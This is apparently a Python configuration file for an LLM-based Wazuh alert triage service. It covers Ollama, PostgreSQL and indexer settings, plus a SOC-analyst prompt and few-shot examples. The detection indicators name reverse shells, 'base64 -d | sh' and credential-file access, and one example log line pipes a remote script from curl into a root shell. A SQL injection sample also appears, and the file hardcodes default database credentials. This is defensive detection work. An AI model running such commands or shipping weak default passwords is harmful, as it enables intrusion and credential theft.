import os

def _get_bool(name: str, default: bool) -> bool:
    val = os.getenv(name)
    if val is None or val.strip() == "":
        return default
    return val.strip().lower() in ("1", "true", "yes", "on")

def _get_list(name: str):
    return [v.strip() for v in os.getenv(name, "").split(",") if v.strip()]

# ====================== Ollama Configuration ========================= #
OLLAMA_HOST = os.getenv("OLLAMA_HOST", "detector-ollama")
OLLAMA_PORT = os.getenv("OLLAMA_PORT", "11434")
OLLAMA_URL = f"http://{OLLAMA_HOST}:{OLLAMA_PORT}"
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "llama3.2:latest")
OLLAMA_TIMEOUT = int(os.getenv("OLLAMA_TIMEOUT", "60"))
OLLAMA_TEMPERATURE = float(os.getenv("OLLAMA_TEMPERATURE", "0.1"))
OLLAMA_NUM_PREDICT = int(os.getenv("OLLAMA_NUM_PREDICT", "600"))
# schema = enforce the output JSON schema, json = any valid JSON, none = free text
OLLAMA_FORMAT = os.getenv("OLLAMA_FORMAT", "schema").strip().lower()

# ==================== PostgreSQL Configuration ======================== #
POSTGRES_HOST = os.getenv('POSTGRES_HOST', 'postgres')
POSTGRES_PORT = os.getenv('POSTGRES_PORT', '5432')
POSTGRES_DB = os.getenv('POSTGRES_DB', 'security_inc')
POSTGRES_USER = os.getenv('POSTGRES_USER', 'user123')
POSTGRES_PASSWORD = os.getenv('POSTGRES_PASSWORD', 'password123')

# ==================== Wazuh Indexer Configuration ===================== #
# Connection details are provided by the partner. Placeholders such as
# "<partner-indexer-host>" are treated as "not configured".
INDEXER_URL = os.getenv("INDEXER_URL", "").rstrip("/")
INDEXER_USER = os.getenv("INDEXER_USER", "")
INDEXER_PASSWORD = os.getenv("INDEXER_PASSWORD", "")
INDEXER_INDEX = os.getenv("INDEXER_INDEX", "wazuh-alerts-4.x-*")
INDEXER_VERIFY_TLS = _get_bool("INDEXER_VERIFY_TLS", True)
INDEXER_CA_CERT = os.getenv("INDEXER_CA_CERT", "").strip()
INDEXER_POLL_INTERVAL = float(os.getenv("INDEXER_POLL_INTERVAL", "10"))  # seconds
INDEXER_PAGE_SIZE = int(os.getenv("INDEXER_PAGE_SIZE", "200"))
INDEXER_LOOKBACK_MIN = int(os.getenv("INDEXER_LOOKBACK_MIN", "5"))  # first run only
# Only read alerts older than this, so alerts still being indexed are not skipped.
INDEXER_SETTLE_SEC = int(os.getenv("INDEXER_SETTLE_SEC", "30"))

def indexer_configured() -> bool:
    values = (INDEXER_URL, INDEXER_USER, INDEXER_PASSWORD)
    return all(values) and not any("<" in v or ">" in v for v in values)

# ==================== Alert Filtering ================================== #
# The partner sets every event to a low rule level, so analyze everything by default.
MIN_RULE_LEVEL = int(os.getenv("MIN_RULE_LEVEL", "0"))
RULE_ID_ALLOWLIST = _get_list("RULE_ID_ALLOWLIST")   # empty = all rules
RULE_ID_DENYLIST = _get_list("RULE_ID_DENYLIST")     # mute noisy rules

# ==================== Analysis Configuration =========================== #
DETECTION_THRESHOLD = float(os.getenv('DETECTION_THRESHOLD', '0.85'))
# Small models produce confident false positives, so by default only a strong-indicator match can
# make an alert an Anomaly; LLM-only HIGH/CRITICAL verdicts become Needs Attention.
# Set to false with a stronger model.
REQUIRE_INDICATOR_FOR_ANOMALY = _get_bool("REQUIRE_INDICATOR_FOR_ANOMALY", True)
NUM_WORKERS = int(os.getenv("NUM_WORKERS", "1"))
RATE_LIMIT_DELAY = float(os.getenv('RATE_LIMIT_DELAY', '0'))  # seconds between LLM calls per worker
MAX_FIELD_CHARS = int(os.getenv("MAX_FIELD_CHARS", "2000"))

# ============================== LLM PROMPT ============================== #
WAZUH_PROMPT = """You are a senior SOC analyst performing anomaly detection on events forwarded by Wazuh.

CONTEXT:
- Wazuh forwards ALL events with the same low rule level. The rule level carries NO meaning and is not shown.
- The rule description and groups only tell you what KIND of event this is, not whether it is malicious.
- The large majority of events are routine system activity. False positives waste analyst time, so be strict.

DECISION RULES:
1. Default to benign. Flag an event only when the fields contain concrete evidence of malicious or unauthorized activity.
2. Every evidence item must quote a value that literally appears in the event (a command, path, user, IP, payload, field=value). If you cannot quote anything, "evidence" must be an empty list.
3. First write the most likely benign explanation. If it plausibly explains the event and no evidence contradicts it, use INFO or LOW.
4. A single routine failure is benign (one failed login, one 404, one denied connection, a service restart, a package install), unless the content itself is malicious.
5. If the event contains any STRONG INDICATOR below, severity must be HIGH or CRITICAL, even if the attack may have failed. Recognising an attack and then rating it INFO or LOW is always wrong.
6. Never invent IPs, users, hosts, processes or values that are not in the event.

COMMONLY BENIGN:
- Package managers (apt, dpkg, yum, dnf), cron jobs, systemd unit start/stop, logrotate, NTP, backups
- Configuration management and monitoring agents (ansible, puppet, chef, zabbix, nagios, wazuh itself)
- Wazuh SCA/rootcheck/CIS benchmark results and agent status messages
- Administrators using sudo for routine maintenance commands
- File integrity changes in log, cache, tmp or package-managed directories during updates

STRONG INDICATORS:
- Injection or traversal payloads (UNION SELECT, ../, <script>, ${{jndi:, ;wget, |sh), web shells
- Reverse shells, encoded or obfuscated commands (base64 -d | sh, powershell -enc, IEX, certutil -urlcache)
- New user accounts, users added to admin/sudo/wheel/Domain Admins groups, password changes on privileged accounts
- Log clearing, audit/AV/EDR/firewall being disabled or stopped
- Persistence: new cron entries, services, scheduled tasks, run keys or authorized_keys by unexpected users
- Access to credential stores (/etc/shadow, SAM, lsass), successful login after many failures described in the event
{family_guidance}
SEVERITY:
- CRITICAL: confirmed compromise or active exploitation
- HIGH: strong indicator of malicious activity
- MEDIUM: unusual and security-relevant, but plausibly legitimate; needs a human look
- LOW: minor deviation, most likely benign
- INFO: routine activity

CONFIDENCE: how sure you are about the severity you chose (0.0-1.0). Use 0.9+ only when the evidence is unambiguous.

{examples}EVENT:
{event}

Return ONLY a JSON object with these keys:
{{
  "summary": "what happened, 1-2 sentences",
  "benign_explanation": "most likely legitimate explanation",
  "evidence": ["quoted values from the event that support suspicion"],
  "event_category": "authentication|privilege_escalation|persistence|execution|network|web_attack|malware|file_change|policy_violation|system|other",
  "mitre": ["ATT&CK technique IDs, only if justified"],
  "severity": "CRITICAL|HIGH|MEDIUM|LOW|INFO",
  "confidence": 0.0
}}"""

# Few-shot examples, off by default: in testing, llama3.2 (3B) copied their wording into unrelated
# answers and became more prone to false positives. Worth re-testing with a larger model.
PROMPT_EXAMPLES = _get_bool("PROMPT_EXAMPLES", False)
FEW_SHOT_EXAMPLES = '''EXAMPLES (shortened illustrations of the reasoning only; they are NOT the event. Never copy their wording or values into your answer):
Event: {"program": "sudo", "full_log": "admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt-get upgrade -y"}
Answer: {"summary": "Admin ran a package upgrade as root.", "benign_explanation": "Routine maintenance by an administrator.", "evidence": [], "event_category": "system", "mitre": [], "severity": "INFO", "confidence": 0.9}

Event: {"decoder": "web-accesslog", "full_log": "203.0.113.4 - - \\"GET /item.php?id=5%27%20OR%201=1-- HTTP/1.1\\" 200 812 \\"-\\" \\"curl/8.0\\""}
Answer: {"summary": "SQL injection attempt against item.php that returned HTTP 200.", "benign_explanation": "None plausible: a tautology payload is never sent by normal clients.", "evidence": ["id=5' OR 1=1--", "200"], "event_category": "web_attack", "mitre": ["T1190"], "severity": "HIGH", "confidence": 0.9}

Event: {"program": "sshd", "full_log": "Failed password for invalid user test from 198.51.100.8 port 40022 ssh2"}
Answer: {"summary": "Single failed SSH login for a non-existent user.", "benign_explanation": "Background internet scanning; one attempt with no success.", "evidence": [], "event_category": "authentication", "mitre": [], "severity": "LOW", "confidence": 0.8}

Event: {"program": "sudo", "full_log": "www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/bin/sh -c curl -s http://203.0.113.9/x.sh | sh"}
Answer: {"summary": "Web server account downloaded and executed a remote script as root.", "benign_explanation": "None plausible: web service accounts do not pipe remote scripts into a root shell.", "evidence": ["www-data", "curl -s http://203.0.113.9/x.sh | sh"], "event_category": "execution", "mitre": ["T1059.004", "T1105"], "severity": "CRITICAL", "confidence": 0.95}

'''

FAMILY_GUIDANCE = {
    "system": """
SOURCE GUIDANCE (Linux/Unix system):
- sshd: isolated failed logins and invalid users from the internet are background noise; root logins, logins from unusual sources after failures, or new authorized_keys are not.
- sudo/su: routine admin commands are benign; shells, editing /etc/sudoers, chmod +s, or sudo by service accounts are suspicious.
""",
    "windows": """
SOURCE GUIDANCE (Windows event log):
- 4624/4634 logon/logoff and 4672 special privileges for SYSTEM or service accounts are routine.
- Suspicious: 1102 (log cleared), 4720 (user created), 4728/4732/4756 (added to privileged group), 7045 (new service) with odd paths, 4698 (scheduled task), PowerShell with -enc/IEX/DownloadString.
""",
    "web": """
SOURCE GUIDANCE (web server):
- 404s, crawlers and health checks are routine. Single scanner probes for common paths are LOW at most.
- Suspicious: injection or traversal payloads, web shell names (cmd.php, shell.jsp), successful (2xx) responses to attack payloads, POSTs to upload endpoints with executable extensions.
""",
    "ids": """
SOURCE GUIDANCE (IDS/Suricata):
- Signatures in categories like "Not Suspicious Traffic", "Generic Protocol Command Decode" or policy/info SIDs are usually routine.
- Weigh the signature category, direction (inbound vs outbound) and whether the target is internal.
""",
    "firewall": """
SOURCE GUIDANCE (firewall):
- Single denied inbound connections are routine internet noise.
- Suspicious: allowed connections to unusual ports from external hosts, outbound connections from servers to rare destinations, internal hosts scanning many ports.
""",
    "fim": """
SOURCE GUIDANCE (file integrity monitoring):
- Changes during package updates or in log/cache/tmp directories are routine.
- Suspicious: changes to /etc/passwd, /etc/shadow, /etc/sudoers, authorized_keys, cron directories, system binaries outside updates, or new executables in web roots.
""",
    "audit": """
SOURCE GUIDANCE (auditd):
- Routine syscalls by system daemons are benign.
- Suspicious: execve of shells or network tools by web/service users, changes to audit rules, access to credential files.
""",
}
